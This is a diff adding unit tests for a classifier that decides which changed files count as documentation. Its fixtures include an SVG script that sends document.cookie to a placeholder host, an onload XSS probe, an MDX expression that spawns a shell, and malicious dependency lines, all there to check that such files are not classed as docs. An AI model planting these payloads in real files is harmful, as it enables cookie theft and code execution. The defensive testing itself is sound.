@@ -248,3 +248,46 @@ describe("parseUnifiedDiff", () => {
     expect(out).toContain("README.md");
   });
 });
+
+describe("classifyDiff: a doc extension is docs only when it cannot carry executable or dependency content", () => {
+  const SVG_SCRIPT = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://x.example/?c=" + document.cookie)</script></svg>`;
+
+  test("svg can hold a <script>: it is not docs", () => {
+    expect(cls(file("docs/logo.svg", ...add(SVG_SCRIPT)))).not.toBe("docs");
+    expect(cls(file("web/public/icon.svg", ...add("<svg onload=\"alert(1)\"/>")))).not.toBe("docs");
+  });
+
+  test("a txt file is not docs: requirements and constraints files name what gets installed", () => {
+    expect(cls(file("requirements.txt", ...add("evil-package==1.0.0")))).toBe("capability");
+    expect(cls(file("tools/requirements-dev.txt", ...add("evil-package==1.0.0")))).toBe("capability");
+    expect(cls(file("constraints.txt", ...add("evil-package==1.0.0")))).toBe("capability");
+    expect(cls(file("docs/notes.txt", ...add("a plain note")))).not.toBe("docs");
+  });
+
+  test("a lockfile or dependency manifest of any ecosystem is a dependency change", () => {
+    for (const path of ["Cargo.lock", "poetry.lock", "uv.lock", "Gemfile.lock", "composer.lock", "go.sum", "bun.lock"]) {
+      expect(cls(file(path, ...add("evil 1.0.0")))).toBe("capability");
+    }
+    for (const path of ["Cargo.toml", "pyproject.toml", "go.mod", "Gemfile", "Pipfile"]) {
+      expect(cls(file(path, ...add("evil = \"1.0.0\"")))).toBe("capability");
+    }
+  });
+
+  test("mdx compiles to JSX and runs its expressions: not docs", () => {
+    expect(cls(file("docs/page.mdx", ...add("{Bun.spawnSync(['sh', '-c', 'x'])}")))).not.toBe("docs");
+  });
+
+  test("a rename into svg or txt keeps the old path's class, binary or not", () => {
+    const moved = (oldPath: string, path: string, extra: Partial<ChangedFile> = {}): ChangedFile => ({ path, oldPath, patch: "", ...extra });
+    expect(cls(moved("src/policy.ts", "docs/policy.svg"))).not.toBe("docs");
+    expect(cls(moved("requirements.txt", "docs/requirements.md"))).toBe("capability");
+    expect(cls(moved("docs/a.txt", "docs/b.md"))).not.toBe("docs");
+  });
+
+  test("the doc assets that cannot run stay docs", () => {
+    expect(cls({ path: "docs/shot.png", patch: "", binary: true })).toBe("docs");
+    expect(cls(file("docs/notes.md", ...add("a note")))).toBe("docs");
+    expect(cls(file("docs/spec.rst", ...add("a note")))).toBe("docs");
+    expect(cls(file("LICENSE", ...add("MIT")))).toBe("docs");
+  });
+});
